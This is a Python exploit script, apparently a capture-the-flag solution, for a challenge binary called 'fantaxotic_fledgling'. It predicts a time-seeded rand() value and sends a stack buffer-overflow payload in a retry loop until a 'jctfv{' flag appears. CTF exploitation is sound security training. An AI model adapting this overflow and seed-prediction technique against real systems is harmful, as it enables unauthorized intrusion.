#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
from ctypes import CDLL

context.log_level = 'debug'
exe = context.binary = ELF('./fantaxotic_fledgling', checksec=False)
libc = exe.libc


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

b *vuln+113
c
'''.format(**locals())



p = start()

# ==================== EXPLOIT ====================

def exploit():
    global p
    
    while True:
        try:
            p = start()
            
            libc = CDLL(None)
            seed = int(time.time())
            libc.srand(seed)
            v3 = libc.rand() % 100 
            payload = b'A' * 0x40 + p8(v3) + b'B' * 46 + b'DEADBEEF'
            
            ru(b"Send your message: ")
            
            sl(payload)
            
            data = rl()[:-1]
            
            if b"jctfv{" in data:
                log.success("Found flag: %s", data.decode().strip())
                break
            
        except EOFError:
            log.warning("Connection closed, retrying...")
            p.close()
            continue
        except Exception as e:
            log.error("Error: %s", str(e))
            p.close()
            continue
        
        p.close()
        
    interactive()

if __name__ == '__main__':
    exploit()